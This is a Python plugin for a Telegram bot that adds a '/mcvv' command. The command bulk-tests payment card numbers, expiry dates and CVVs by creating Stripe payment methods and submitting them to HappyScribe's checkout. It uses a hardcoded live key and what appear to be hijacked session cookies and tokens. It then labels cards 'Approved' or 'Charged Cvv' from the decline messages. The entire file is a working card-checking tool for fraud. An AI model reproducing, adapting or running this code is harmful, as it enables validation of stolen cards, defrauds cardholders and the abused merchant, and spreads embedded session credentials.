import aiohttp
import asyncio
import re
import os
import aiofiles
from pyrogram import filters
from EQUROBOT import app

VALID_CC_STARTS = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')

async def process_credit_card(cc_entry, session):
    try:
        x = re.findall(r'\d+', cc_entry)
        if len(x) != 4:
            return f'Invalid CC format in entry: {cc_entry}\n'

        ccn, mm, yy, cvv = x

        if not ccn.startswith(VALID_CC_STARTS):
            return f'Invalid CC type in entry: {cc_entry}\n'

        headers = {
            'authorization': 'Bearer EsVfB1j947HZeJUWaD718Qtt',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'type': 'card',
            'billing_details': {'name': 'Hhg'},
            'card': {
                'number': ccn,
                'cvc': cvv,
                'exp_month': mm,
                'exp_year': yy,
            },
            'guid': '91fbb521-dec9-4c76-8a30-db763fc485d44a83b0',
            'muid': '68b9b01b-e7ac-4f0e-93d3-fd61d4a9cab3935f67',
            'sid': '8152f767-b5bf-4c00-a90e-81d5262832d6715ab4',
            'payment_user_agent': 'stripe.js/2649440aa6; stripe-js-v3/2649440aa6; split-card-element',
            'referrer': 'https://www.happyscribe.com',
            'time_on_page': 32334,
            'key': 'pk_live_cWpWkzb5pn3JT96pARlEkb7S',
        }

        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, json=data) as response:
            response_json = await response.json()
            id = response_json.get('id')

        cookies = {
            'ahoy_visitor': '1f532397-581b-4f95-a667-2370c55ae926',
            'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-22T18%3A46%3A20.546Z%22%2C%22consentId%22%3A%224fc44b3b-9d38-4f72-852a-a06b50b77292%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-22T18%3A46%3A20.546Z%22%7D',
            '_gcl_au': '1.1.1241378566.1716403581',
            'intercom-device-id-frdatdus': '2c5ddf8e-59c7-4199-9815-82245c5daeb3',
            'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVGswTnpNME5sMHNJbmszVldacFZHWmthRUZpU2tWUVpXaDJNMHd0SWl3aU1UY3hOalF3TXpZeU9TNHpOamt4TWpnaVhRPT0iLCJleHAiOiIyMDI0LTA1LTI5VDE4OjQ3OjA5LjM2OVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--0df545370eb506f06655a31fd198d26fec6ca03b',
            'unsecure_is_signed_in': '1',
            '_cioid': '11947346',
            '__stripe_mid': '68b9b01b-e7ac-4f0e-93d3-fd61d4a9cab3935f67',
            'ahoy_visit': '7fedd670-f9d6-4c54-a4ac-6c3fa2c5fc24',
            '_ga': 'GA1.2.1201600738.1716403570',
            '_gid': 'GA1.2.1234188292.1716777675',
            '_gat_UA-97995424-1': '1',
            'intercom-session-frdatdus': 'NFZEQjlKY0t1dUMyM2hwN0NqT2I3Rm5YWHVTY3BLaG9qb3JUeDJDTDhrcUdDNm1qRktzNERzMHNLcGt0V0VHVy0tQmlvbGtlYTlCZmF3WStqWHVXcXFxUT09--605b33f745246c869fa563efb6a366154020cbd2',
            '_ga_4T8KCV9Y2D': 'GS1.1.1716777674.4.1.1716777683.51.0.0',
            '__stripe_sid': '8152f767-b5bf-4c00-a90e-81d5262832d6715ab4',
            '_transcribe_session': 'gNnlLC1Wo2%2FGKDkUT%2B9eEHJvRM7pCSX62VbVti4ilnJ2vQEzmi1trInmJk9l0HLdFcsy5fVtsNL8C377Hf4pCF5c%2BEIy%2FHMRCIyZXdJxLZcEH%2BwRc2kzcC2WYShcsjvo1Imw79TpkzUTFwSm6uhyHWNSm4jJiI0TRZABJS5feV1yygELAGxiyuWVnjsgAxnou99uLIpO4NSJbB87AF1NY1rry9qLVR6BGFAKw1AZZL2uEn%2FzD%2FY3iXtZMilLYddXZ%2B8KcHSvof0J6wVAkfo8z5bA3khEu8lS26Py0QoB%2BMVX7EXOb%2B3fsnBVVf9O4PFuY63qSumhWo8JYj5blj31O51Z%2BhAtS9FAby6RValiK8DD9YoUtsJDfWdnAIbGi%2BNxdLoJl8qxwn9THj5NZDY2sUHgYg%3D%3D--gt4ad5nhsiL4XeD6--8kcGD5T7tOu0yRDtheQbsw%3D%3D',
        }

        headers = {
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'origin': 'https://www.happyscribe.com',
            'referer': 'https://www.happyscribe.com/v2/11453735/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'id': 11132807,
            'address': 'Eee',
            'name': 'Hhg',
            'country': 'US',
            'vat': None,
            'billing_account_id': 11132807,
            'last4': '6650',
            'orderReference': 'zmemwaft',
            'user_id': 11947346,
            'organization_id': 11453735,
            'hours': 0,
            'balance_increase_in_cents': None,
            'payment_method_id': id,
            'transcription_id': None,
            'plan': 'basic_2023_05_01',
            'order_id': None,
            'recurrence_interval': 'month',
            'extra_plan_hours': None,
        }

        async with session.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data) as response:
            await asyncio.sleep(3)  # Replace time.sleep with asyncio.sleep
            response_json = await response.json()
            msg = response_json.get('error', '')

        P = f"{ccn}|{mm}|{yy}|{cvv}"

        if "card has insufficient funds" in msg:
            msg1 = f'''
◆ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
◆ 𝑪𝑨𝑹𝑫  ➜ `{P}`
◆ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➜ {msg}
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Charged Cvv
            '''
            return msg1
        elif "security code or expiration date is incorrect" in msg or "Your card's security code is incorrect." in msg:
            msg2 = f'''
◆ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
◆ 𝑪𝑨𝑹𝑫  ➜ `{P}`
◆ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➜ {msg}
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Card Issuer Declined Cvv 
            '''
            return msg2
        else:
            msg3 = f'''
◆ 𝑪𝑨𝑹𝑫  ➜ `{P}`
◆ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➜ {msg}
            '''
            return msg3

    except Exception as e:
        return f"Error processing CC entry: {e}\n"

async def process_credit_cards_in_file(file_path, output_file):
    try:
        async with aiofiles.open(file_path, 'r') as file, aiofiles.open(output_file, 'w') as outfile:
            async with aiohttp.ClientSession() as session:
                async for line in file:
                    cc_entry = line.strip()
                    result = await process_credit_card(cc_entry, session)
                    await outfile.write(result)

    except Exception as e:
        async with aiofiles.open(output_file, 'w') as outfile:
            await outfile.write(f"Error reading file: {e}\n")

@app.on_message(filters.command("mcvv", prefixes=[".", "/"]))
async def check_cc(_, message):
    command_prefix_length = len(message.text.split()[0])
    cc_entry = message.text[command_prefix_length:].strip()

    reply_msg = message.reply_to_message
    if reply_msg:
        if reply_msg.text:
            cc_entries = []
            cc_regex = re.compile(r'\b(?:\d[ -]*?){13,16}\b')
            for line in reply_msg.text.strip().split('\n'):
                matches = cc_regex.findall(line)
                if matches:
                    cc_entries.extend(matches)
            async with aiohttp.ClientSession() as session:
                results = [await process_credit_card(entry, session) for entry in cc_entries]
            await message.reply_text("\n\n".join(results))
        elif reply_msg.document:
            file_path = await app.download_media(reply_msg.document.file_id)
            output_file = f"results_{reply_msg.document.file_name}.txt"
            await process_credit_cards_in_file(file_path, output_file)
            os.remove(file_path)
            await message.reply_document(document=output_file)
            os.remove(output_file)
        else:
            await message.reply_text("Unsupported file type.")
            return

    elif cc_entry:
        cc_entries = cc_entry.split('\n')
        async with aiohttp.ClientSession() as session:
            results = [await process_credit_card(entry, session) for entry in cc_entries]
        await message.reply_text("\n\n".join(results))
    else:
        await message.reply_text("Please provide credit card details or reply to a message containing them.")
